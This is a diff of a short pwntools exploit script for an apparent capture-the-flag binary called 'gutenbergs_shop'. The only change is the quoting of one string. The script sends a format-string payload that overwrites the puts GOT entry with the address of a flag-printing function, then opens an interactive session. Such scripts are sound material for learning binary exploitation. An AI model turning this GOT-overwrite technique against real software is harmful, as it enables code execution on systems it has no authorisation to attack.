@@ -16,7 +16,7 @@ p = gdb.debug('./gutenbergs_shop', '''
 PUTS_GOT = 0x601018
 FLAG_USABLE = 0x4006a4
 context.bits = 64
-p.sendlineafter(b'Welcome to Ye Olde Printing Hous! Pray tell what you wish to have printed', fmtstr_payload(6, {PUTS_GOT: FLAG_USABLE}))
+p.sendlineafter(b"Welcome to Ye Olde Printing Hous! Pray tell what you wish to have printed", fmtstr_payload(6, {PUTS_GOT: FLAG_USABLE}))
 
 p.interactive()
 
